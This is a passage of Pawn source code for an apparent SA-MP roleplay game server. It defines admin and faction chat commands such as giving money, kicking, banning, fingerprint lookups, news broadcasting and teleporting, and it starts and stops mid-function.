				} else PlayerInfo[i][pVW] = GetPlayerVirtualWorld(i);

				GetPlayerIp(i, PlayerInfo[i][pIP], 32);
				GetPlayerPos(i, PlayerInfo[i][pPos_x], PlayerInfo[i][pPos_y], PlayerInfo[i][pPos_z]);
				GetPlayerFacingAngle(i, PlayerInfo[i][pPos_r]);
				if(GetPlayerArmour(i, fArmour) < ValidArmor[i])	GetPlayerArmour(i, PlayerInfo[i][pArmor]);
				else PlayerInfo[i][pArmor] = ValidArmor[i];
				GetPlayerHealth(i, PlayerInfo[i][pHealth]);
				SaveAccount(i);
			}
		}
        SendClientMessage(playerid, COLOR_YELLOW, "All player accounts updated successfully.");
        SaveFamilies();
        SaveFamiliesHQ();
        SendClientMessage(playerid, COLOR_YELLOW, "All families updated successfully.");
        UpdatePoints();
        SendClientMessage(playerid, COLOR_YELLOW, "All points updated successfully.");

    }
    else {
        SendClientMessage(playerid, COLOR_GREY, "You're not authorized to use that command!");
    }
    return 1;
}

CMD:givemoney(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid, money;
		if(sscanf(params, "ud", giveplayerid, money)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /givemoney [playerid/partofname] [money]");

		if(IsPlayerConnected(giveplayerid))
		{
			GivePlayerCash(giveplayerid, money);
			format(string, sizeof(string), "You have given %s $%d!",GetPlayerNameEx(giveplayerid),money);
			SendClientMessage(playerid, COLOR_WHITE, string);
			format(string, sizeof(string), "%s has given %s $%d (via /givemoney)", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid),money);
			Log("logs/adminmoney.log", string);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:paintballstats(playerid, params[]) {
	if(!IsBETAServer())
	    return SendClientMessage(playerid, COLOR_GREY, "This isn't on the beta server!");

	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid))
	    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /paintballstats [playerid]");

	if(giveplayerid == INVALID_PLAYER_ID)
		return SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");

	format(string, sizeof(string), "PaintballTeam: %d",PaintballTeam[playerid]);
	SendClientMessage(playerid, COLOR_WHITE, string);

	format(string, sizeof(string), "PBM: %d",GetPVarType(giveplayerid, "PBM"));
	SendClientMessage(playerid, COLOR_WHITE, string);
	new
		Team1Total,
		Team2Total;

	foreach(Player, i) {
		if(GetPVarInt(i, "PBM") == GetPVarInt(giveplayerid, "PBM")) {
			if(PaintballTeam[i] == 1) Team1Total ++;
			else if(PaintballTeam[i] == 2) Team2Total ++;
		}
	}
	format(string, sizeof(string), "Team1Total: %d",Team1Total);
	SendClientMessage(playerid, COLOR_WHITE, string);
	format(string, sizeof(string), "Team2Total: %d",Team2Total);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:setplayerteam(playerid, params[]) {
	if(!IsBETAServer())
	    return SendClientMessage(playerid, COLOR_GREY, "This isn't on the beta server!");

	new string[128], giveplayerid, team;
	if(sscanf(params, "ui", giveplayerid, team))
	    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /setplayerteam [playerid] [team]");

	if(giveplayerid == INVALID_PLAYER_ID)
		return SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");

	format(string, sizeof(string), "You have set %s to team %d.",GetPlayerNameEx(giveplayerid),team);
	SendClientMessage(playerid, COLOR_WHITE, string);

	format(string, sizeof(string), "%s has set your team to %d.",GetPlayerNameEx(playerid),team);
	SendClientMessage(giveplayerid, COLOR_WHITE, string);

	SetPlayerTeam(giveplayerid, team);
	return 1;
}

CMD:setmoney(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid, money;
		if(sscanf(params, "ud", giveplayerid, money)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /setmoney [playerid/partofname] [money]");

		if(IsPlayerConnected(giveplayerid))
		{
			ResetPlayerCash(giveplayerid);
			GivePlayerCash(giveplayerid, money);
			format(string, sizeof(string), "You have set %s's money to $%d!",GetPlayerNameEx(giveplayerid),money);
			SendClientMessage(playerid, COLOR_WHITE, string);
			format(string, sizeof(string), "%s has set %s's money to $%d (/setmoney)", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), money);
			Log("logs/adminmoney.log", string);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:revive(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /revive [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(GetPVarInt(giveplayerid, "Injured") == 1)
			{
				format(string, sizeof(string), " You have revived %s.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);
				SendClientMessage(giveplayerid, COLOR_WHITE, "You have been revived by an Admin.");

				KillEMSQueue(giveplayerid);
   				ClearAnimations(giveplayerid, 1);
   				SetPlayerHealth(giveplayerid, 100);

   				foreach(Player, i) {
   					if(EMSAccepted[i] == giveplayerid) {
   					    format(string, sizeof(string), "%s has been revived by an admin, your checkpoint has been destroyed.", GetPlayerNameEx(giveplayerid));
   					    cmd_killcheckpoint(i, "");
					}
   				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "That player is not injured!");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:kick(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /kick [playerid/partofname] [reason]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pAdmin] < PlayerInfo[playerid][pAdmin]) {
				new playerip[32];
				GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
				format(string, sizeof(string), "AdmCmd: %s (IP:%s) was kicked by %s, reason: %s", GetPlayerNameEx(giveplayerid), playerip, GetPlayerNameEx(playerid), reason);
				Log("logs/kick.log", string);
				format(string, sizeof(string), "AdmCmd: %s was kicked by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
				SendClientMessageToAllEx(COLOR_LIGHTRED, string);
				Kick(giveplayerid);
			}
			return 1;
		} else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:skick(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /skick [playerid/partofname] [reason]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pAdmin] < PlayerInfo[playerid][pAdmin]) {
				new playerip[32];
				GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
				format(string, sizeof(string), "AdmCmd: %s(IP:%s) was silent kicked by %s, reason: %s", GetPlayerNameEx(giveplayerid), playerip, GetPlayerNameEx(playerid), reason);
				Log("logs/kick.log", string);
				format(string, sizeof(string), "AdmCmd: %s was silent kicked by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
				ABroadCast(COLOR_LIGHTRED,string,1);
				Kick(giveplayerid);
			}
			return 1;

		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:fingerprint(playerid, params[]) {
	new
	    iTarget,
	    szSex[7],
		szJob[64],
		szJob2[64],
	    szMessage[128];

	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2)  {
		if(sscanf(params, "u", iTarget))
		    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /fingerprint [playerid/partofname]");

		if(!IsPlayerConnected(iTarget))
		    return SendClientMessage(playerid, COLOR_GREY, "The specified player is not connected.");

		if(GetDistanceBetweenPlayers(iTarget, playerid) > 5)
		    return SendClientMessage(playerid, COLOR_GREY, "You're too far away.");

		if(PlayerCuffed[iTarget] == 0)
			return SendClientMessage(playerid, COLOR_GREY, "The suspect must be restrained before you can perform a IAFIS scan.");

		if(PlayerInfo[iTarget][pCrimes] == 0)
		    return SendClientMessage(playerid, COLOR_GREY, "IAFIS has found no matches for the scanned fingerprint.");

		SendClientMessage(playerid, COLOR_GREY, "-----------------------------------------");

		if(PlayerInfo[iTarget][pSex] == 1)
			szSex = "Male";
		else
			szSex = "Female";

		format(szMessage, sizeof(szMessage), "Name: %s (age: %d, sex: %s)", GetPlayerNameEx(iTarget), PlayerInfo[iTarget][pAge], szSex);
		SendClientMessage(playerid, COLOR_WHITE, szMessage);

		if(PlayerInfo[iTarget][pHouse] != INVALID_HOUSE_ID) {
			new
				szZone[MAX_ZONE_NAME];

			Get2DPosZone(HouseInfo[PlayerInfo[iTarget][pHouse]][hExteriorX], HouseInfo[PlayerInfo[iTarget][pHouse]][hExteriorY], szZone, MAX_ZONE_NAME);
			format(szMessage, sizeof(szMessage), "House: %d %s", PlayerInfo[iTarget][pHouse], szZone);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
		} else if(PlayerInfo[iTarget][pHouse2] != INVALID_HOUSE_ID) {
			new
				szZone[MAX_ZONE_NAME];

			Get2DPosZone(HouseInfo[PlayerInfo[iTarget][pHouse2]][hExteriorX], HouseInfo[PlayerInfo[iTarget][pHouse2]][hExteriorY], szZone, MAX_ZONE_NAME);
			format(szMessage, sizeof(szMessage), "House (2): %d %s", PlayerInfo[iTarget][pHouse2], szZone);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
		}

		format(szMessage, sizeof(szMessage), "Prior convictions: %d", PlayerInfo[iTarget][pCrimes]);
		SendClientMessage(playerid, COLOR_WHITE, szMessage);

		format(szMessage, sizeof(szMessage), "Prior arrests: %d", PlayerInfo[iTarget][pArrested]);
		SendClientMessage(playerid, COLOR_WHITE, szMessage);

		switch(PlayerInfo[iTarget][pJob])
		{
			case 1: szJob = "Detective";
			case 2: szJob = "Lawyer";
			case 7: szJob = "Car Mechanic";
			case 8: szJob = "Bodyguard";
			case 12: szJob = "Boxer";
			case 17: szJob = "Taxi Driver";
			case 19: szJob = "Bartender";
			case 20: szJob = "Trucker";
			case 21: szJob = "Pizza Boy";
			default: szJob = "None";
		}
		switch(PlayerInfo[iTarget][pJob2])
		{
			case 1: szJob2 = "Detective";
			case 2: szJob2 = "Lawyer";
			case 7: szJob2 = "Car Mechanic";
			case 8: szJob2 = "Bodyguard";
			case 12: szJob2 = "Boxer";
			case 17: szJob2 = "Taxi Driver";
			case 19: szJob2 = "Bartender";
			case 20: szJob2 = "Trucker";
			case 21: szJob2 = "Pizza Boy";
			default: szJob2 = "None";
		}

		format(szMessage, sizeof(szMessage), "Job 1: %s - Job 2: %s", szJob, szJob2);
		SendClientMessage(playerid, COLOR_WHITE, szMessage);

		SendClientMessage(playerid, COLOR_GREY, "-----------------------------------------");
 	}
	return 1;
}

CMD:ban(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /ban [playerid/partofname] [reason]");

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin]) {
				if(AdminDuty[playerid] == 1) {
					new username[MAX_PLAYER_NAME];
					GetPVarString(playerid, "TempNameName", username, sizeof(username));
					SetPVarInt(playerid, "TempName", 0);
					SetPlayerName(playerid, username);
				}

				format(string, sizeof(string), "AdmCmd: %s has been auto-banned, reason: Trying to /ban a higher admin.", PlayerInfo[playerid][pAdminName]);
				ABroadCast(COLOR_YELLOW,string,1);
				punishmentLog(giveplayerid, playerid, 4, string, reason);
				PlayerInfo[playerid][pBanned] = 1;
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				return 1;
			} else {
				new playerip[32];
				GetPlayerIp(giveplayerid, playerip, sizeof(playerip));

				if(AdminDuty[giveplayerid] == 1) {
					new username[MAX_PLAYER_NAME];
					GetPVarString(giveplayerid, "TempNameName", username, sizeof(username));
					SetPVarInt(giveplayerid, "TempName", 0);
					SetPlayerName(giveplayerid, username);

					format(string, sizeof(string), "AdmCmd: %s(IP:%s) was banned by %s, reason: %s", PlayerInfo[giveplayerid][pAdminName], playerip, GetPlayerNameEx(playerid), reason);
					Log("logs/ban.log", string);
					punishmentLog(giveplayerid, playerid, 4, string, reason);

					format(string, sizeof(string), "AdmCmd: %s was banned by %s, reason: %s", PlayerInfo[giveplayerid][pAdminName], GetPlayerNameEx(playerid), reason);
				} else {
					format(string, sizeof(string), "AdmCmd: %s(IP:%s) was banned by %s, reason: %s", GetPlayerNameEx(giveplayerid), playerip, GetPlayerNameEx(playerid), reason);
					Log("logs/ban.log", string);
					punishmentLog(giveplayerid, playerid, 4, string, reason);

					format(string, sizeof(string), "AdmCmd: %s was banned by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
				}

				SendClientMessageToAllEx(COLOR_LIGHTRED, string);
				PlayerInfo[giveplayerid][pBanned] = 1;
				new ip[32];
				GetPlayerIp(giveplayerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(giveplayerid);
				return 1;
			}

		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:air(playerid, params[]) {
	return cmd_nr(playerid, params);
}

CMD:startnews(playerid, params[]) {
    if(PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) {
		if(PlayerInfo[playerid][pRank] >= 4) {
		    if(shutdown == 1) {
				shutdown = 0;
				SendClientMessage(playerid, COLOR_WHITE, "You have started the news broadcasting station.");
			} else SendClientMessage(playerid, COLOR_GREY, "The news broadcasting station is already started.");
		}
	}
	return 1;
}

CMD:stopnews(playerid, params[]) {
    if(PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) {
		if(PlayerInfo[playerid][pRank] >= 4) {
		    if(shutdown == 0) {
				shutdown = 1;
				SendClientMessage(playerid, COLOR_WHITE, "You have shut the news broadcasting station down.");
			}  else SendClientMessage(playerid, COLOR_GREY, "The news broadcasting station is already off.");
		}
	}
	return 1;
}

CMD:nr(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) {
		new string[128];

		if(shutdown == 1)
			return SendClientMessage(playerid, COLOR_WHITE, "The news system is currently shut down.");

		if(AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin] < 4)
			return SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");

		if(isnull(params))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /nr [text]");

		new newcar = GetPlayerVehicleID(playerid);
		if(IsANewsVeh(newcar))
		{
			if(PlayerInfo[playerid][pRank] < 1)
			{
				SendClientMessage(playerid, COLOR_GRAD2, "You must be at least rank 1.");
			}
			else
			{
				format(string, sizeof(string), "NR %s: %s", GetPlayerNameEx(playerid), params);
				ICNews(COLOR_LIGHTGREEN,string);
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You're not in a news van or a news chopper.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "You are not a News Reporter!");
	}
	return 1;
}

CMD:liveban(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 9 && PlayerInfo[playerid][pRank] >= 4 || PlayerInfo[playerid][pLeader] == 9) {

		new
			giveplayerid,
			newsreporter,
	        string[128];

	    if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /liveban [player]");

		if(!IsPlayerConnected(giveplayerid))
			return SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");

		foreach(Player, i) {
			if(TalkingLive[i] == giveplayerid) newsreporter = i;
		}

		if(TalkingLive[newsreporter] != INVALID_PLAYER_ID) {
			SendClientMessage(newsreporter, COLOR_LIGHTBLUE, "* Live conversation ended.");
			SendClientMessage(TalkingLive[newsreporter], COLOR_LIGHTBLUE, "* Live conversation ended.");
			TogglePlayerControllable(newsreporter, 1);
			TogglePlayerControllable(TalkingLive[newsreporter], 1);
			TalkingLive[TalkingLive[newsreporter]] = INVALID_PLAYER_ID;
			TalkingLive[newsreporter] = INVALID_PLAYER_ID;
		}

	    if(PlayerInfo[giveplayerid][pLiveBanned] == 0) {
	        PlayerInfo[giveplayerid][pLiveBanned] = 1;
	        format(string, sizeof(string), "%s has interview banned %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
	        SendRadioMessage(9, RADIO, string);
			format(string, sizeof(string), "You have been interview banned by %s", GetPlayerNameEx(playerid));
	        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
	        return 1;
	    }  else  {
	        PlayerInfo[giveplayerid][pLiveBanned] = 0;
	        format(string, sizeof(string), "%s has unbanned %s from interviews", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
	        SendRadioMessage(9, RADIO, string);
			format(string, sizeof(string), "You have been interview unbanned by %s", GetPlayerNameEx(playerid));
	        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
	        return 1;
	    }
	}
	return 1;
}

CMD:live(playerid, params[])
{
	if(AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin] < 4)
		return SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");

	if(PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) {
	    if(shutdown == 1) return SendClientMessage(playerid, COLOR_WHITE, "The news system is currently shut down." );
		if(TalkingLive[playerid] != INVALID_PLAYER_ID) {
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Live conversation ended.");
			SendClientMessage(TalkingLive[playerid], COLOR_LIGHTBLUE, "* Live conversation ended.");
			TogglePlayerControllable(playerid, 1);
			TogglePlayerControllable(TalkingLive[playerid], 1);
			TalkingLive[TalkingLive[playerid]] = INVALID_PLAYER_ID;
			TalkingLive[playerid] = INVALID_PLAYER_ID;
			return 1;
		}

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /live [player]");

		if (IsPlayerConnected(giveplayerid)) {
			if (ProxDetectorS(5.0, playerid, giveplayerid)) {
			    if(PlayerInfo[giveplayerid][pLiveBanned] == 1) return SendClientMessage(playerid, COLOR_GREY, "That player is interview banned.");
				if(PlayerCuffed[giveplayerid] >= 1 || PlayerCuffed[playerid] >= 1) {
					SendClientMessage(playerid, COLOR_GRAD2, "You are unable to do this right now.");
				} else {
					if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot talk live with yourself!"); return 1; }
					format(string, sizeof(string), "* You offered %s to have a live conversation.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s offered you to have a live conversation, type /accept live to accept.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					LiveOffer[giveplayerid] = playerid;
				}
			} else return SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
		} else return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
	} else SendClientMessage(playerid, COLOR_GREY, "   You are not a News Reporter!");
	return 1;
}

CMD:newsdiv(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] == 9 || PlayerInfo[playerid][pFaction] == 9)
	{
		new string[128], giveplayerid, division;
		if(sscanf(params, "ud", giveplayerid, division))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /newsdiv [player] [division]");
			SendClientMessage(playerid, COLOR_GRAD2, "Available division names: 0 (None), 1 (Security)");
			return 1;
		}
		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pFaction] != 9) return 1;
			switch(division)
			{
				case 0:
				{
					PlayerInfo[giveplayerid][pDivision] = 0;
					format(string, sizeof(string), "You haved been kicked out of your current division by %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "You have kicked %s from their division.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				}
				case 1:
				{
					PlayerInfo[giveplayerid][pDivision] = 1;
					format(string, sizeof(string), "You are now in the security division, invited by %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "You have invited %s into the security division.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				}
			}
		}
		else return SendClientMessage(playerid, COLOR_GREY, " That player isn't connected" );
	}
	else return SendClientMessage(playerid, COLOR_GREY, " You can't use this command." );
	return 1;
}

CMD:govdiv(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pLeader] == 5)
	{
		new string[128], giveplayerid, division;
		if(sscanf(params, "ud", giveplayerid, division))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /govdiv [playerid/partofname] [division]");
			SendClientMessage(playerid, COLOR_GRAD2, "Available division names: 1 (None), 2 (Executive), 3 (Judicial), 4 (Legislative), 5 (SS)");
			return 1;
		}

		if(PlayerInfo[playerid][pRank] >= 4)
		{
			if(IsPlayerConnected(giveplayerid))
			{
				if(PlayerInfo[playerid][pFaction] == 5)
				{
					if(division == 2)
					{
						PlayerInfo[giveplayerid][pDivision] = 2;
						format(string, sizeof(string), "You're now in the Executive division, invited by %s.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "You have invited %s to join the Executive division.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					else if(division == 3)
					{
						PlayerInfo[giveplayerid][pDivision] = 3;
						format(string, sizeof(string), "You're now in the Judicial division, invited by %s.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "You have invited %s into the Judicial division.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					else if(division == 4)
					{
						PlayerInfo[giveplayerid][pDivision] = 4;
						format(string, sizeof(string), "You're now in the Legislative division, invited by %s.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "You have invited %s to join the Legislative division.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					else if(division == 5)
					{
						PlayerInfo[giveplayerid][pDivision] = 5;
						format(string, sizeof(string), "You're now in the Serect Service, invited by %s.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "You have invited %s to join the Serect Service division.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
					else if(division == 1)
					{
						PlayerInfo[giveplayerid][pDivision] = 1;
						format(string, sizeof(string), "You have been kicked from your division by %s.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "You have kicked %s out of their division.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}
				}

			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command - only R4+ can do this.");
		}
	}
	return 1;
}

/*CMD:govl(playerid, params[]) {
	if(PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pLeader] == 5)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");

 		if(IsPlayerInRangeOfPoint(playerid,5.0,-1221.620849, -155.842590, 4891.833007))
		{
			ShowPlayerDialogEx(playerid, GOVLOCKERMENU, DIALOG_STYLE_LIST, "Government lockers", "Uniform\nEquipment\nUndercover", "OK", "Cancel");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "You're not in range of your Government lockers.");
		}
	}
	return 1;
}*/

CMD:sban(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /sban [playerid/partofname] [reason]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pAdmin] > PlayerInfo[playerid][pAdmin])
			{
				if(AdminDuty[playerid] == 1)
				{
					new username[MAX_PLAYER_NAME];
					GetPVarString(playerid, "TempNameName", username, sizeof(username));
					SetPVarInt(playerid, "TempName", 0);
					SetPlayerName(playerid, username);
				}
				format(string, sizeof(string), "AdmCmd: %s has been auto-banned, reason: Trying to /sban a higher admin.", PlayerInfo[playerid][pAdminName]);
				ABroadCast(COLOR_YELLOW,string,1);
				PlayerInfo[playerid][pBanned] = 1;
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				return 1;
			}
			else
			{
				new playerip[32];
				GetPlayerIp(giveplayerid, playerip, sizeof(playerip));

				if(AdminDuty[giveplayerid] == 1)
				{
					new username[MAX_PLAYER_NAME];
					GetPVarString(giveplayerid, "TempNameName", username, sizeof(username));
					SetPVarInt(giveplayerid, "TempName", 0);
					SetPlayerName(giveplayerid, username);

					format(string, sizeof(string), "AdmCmd: %s(IP:%s) was silent banned by %s, reason: %s", PlayerInfo[giveplayerid][pAdminName], playerip, GetPlayerNameEx(playerid), reason);
					Log("logs/ban.log", string);
					format(string, sizeof(string), "AdmCmd: %s was silent banned by %s, reason: %s", PlayerInfo[giveplayerid][pAdminName], GetPlayerNameEx(playerid), reason);
				}
				else
				{
					format(string, sizeof(string), "AdmCmd: %s(IP:%s) was silent banned by %s, reason: %s", GetPlayerNameEx(giveplayerid), playerip, GetPlayerNameEx(playerid), reason);
					Log("logs/ban.log", string);
					format(string, sizeof(string), "AdmCmd: %s was silent banned by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
				}

				ABroadCast(COLOR_LIGHTRED,string,1);
				PlayerInfo[giveplayerid][pBanned] = 1;
            	new ip[32];
				GetPlayerIp(giveplayerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(giveplayerid);
				return 1;
			}

		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:goto(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		if(isnull(params))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /goto [location]");
			SendClientMessage(playerid, COLOR_GRAD1, "Locations 1: LS, SF, LV, stadium1, stadium2, stadium3, stadium4");
			SendClientMessage(playerid, COLOR_GRAD2, "Locations 2: int1, mall, bank, allsaints, countygen, gym, fbi, rc");
			SendClientMessage(playerid, COLOR_GRAD3, "Locations 3: prison, mark, trucker, custom");
			return 1;
		}
		if(strcmp(params,"ls",true) == 0)
		{
			if(GetPlayerState(playerid) == 2)
			{
				new tmpcar = GetPlayerVehicleID(playerid);
				SetVehiclePos(tmpcar, 1529.6,-1691.2,13.3);
				LinkVehicleToInterior(tmpcar, 0);
				SetVehicleVirtualWorld(tmpcar, 0);
				TelePos[playerid][0] = 0.0; TelePos[playerid][1] = 0.0;
				fVehSpeed[playerid] = 0.0;
			}
			else
			{
				SetPlayerPos(playerid, 1529.6,-1691.2,13.3);
			}
			SendClientMessage(playerid, COLOR_WHITE, "You have teleported to Los Santos.");
			SetPlayerInterior(playerid,0);
			PlayerInfo[playerid][pInt] = 0;
